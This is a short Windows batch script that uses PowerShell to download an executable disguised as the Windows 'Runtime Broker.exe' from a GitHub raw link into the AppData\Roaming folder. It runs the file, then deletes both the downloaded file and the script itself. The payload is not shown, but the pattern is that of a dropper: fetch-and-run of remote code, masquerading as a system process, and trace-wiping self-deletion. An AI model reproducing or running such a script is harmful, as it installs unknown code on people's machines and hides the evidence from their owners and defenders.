@echo off
set "downloadURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%%20Broker.exe"
set "exePath=C:\Users\Administrator\AppData\Roaming\Runtime Broker.exe"

echo Downloading to %exePath%...
powershell -Command "Invoke-WebRequest -Uri '%downloadURL%' -OutFile '%exePath%'"

if exist "%exePath%" (
    echo Running the downloaded file...
    start "" /wait "%exePath%"
    
    echo Execution finished. Deleting downloaded file...
    del "%exePath%"
) else (
    echo Download failed or file not found.
)

echo Cleaning up this script...
del "%~f0"
